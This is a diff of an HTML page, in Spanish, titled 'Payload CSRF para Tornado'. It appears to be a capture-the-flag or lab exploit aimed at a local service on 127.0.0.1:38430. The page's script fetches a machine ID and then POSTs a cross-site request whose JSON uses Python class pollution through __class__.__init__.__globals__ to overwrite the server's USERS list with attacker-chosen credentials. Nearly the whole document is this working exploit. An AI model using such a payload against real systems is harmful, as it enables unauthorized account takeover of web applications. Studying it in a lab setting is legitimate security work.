@@ -1,24 +1,33 @@
-<script>
-    fetch('http://127.0.0.1:38430/get_tornados')
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Prueba Tornado</title>
+  </head>
+  <body>
+    <h1>Payload CSRF para Tornado</h1>
+    <p>Si ves esto, la página está activa.</p>
+    <script>
+      fetch('http://127.0.0.1:38430/get_tornados')
         .then(response => response.json())
         .then(machines => {
-            let firstMachine = machines[0].machine_id;
-            let json = {
-                "machine_id": firstMachine,
-                "status": "active",
-                "__class__": {
-                    "__init__": {
-                        "__globals__": {
-                            "USERS": [{"username": "carana08", "password": "carana08"}]
-                        }
-                    }
+          let firstMachine = machines[0].machine_id;
+          let json = {
+            "machine_id": firstMachine,
+            "status": "active",
+            "__class__": {
+              "__init__": {
+                "__globals__": {
+                  "USERS": [{"username": "carana08", "password": "carana08"}]
                 }
-            };
-
-            return fetch(`http://127.0.0.1:38430/update_tornado`, {
-                method: "POST",
-                mode: "cors",
-                body: JSON.stringify(json)
-            });
-        })
-</script>
+              }
+            }
+          };
+          return fetch('http://127.0.0.1:38430/update_tornado', {
+            method: "POST",
+            mode: "cors",
+            body: JSON.stringify(json)
+          });
+        });
+    </script>
+  </body>
+</html>
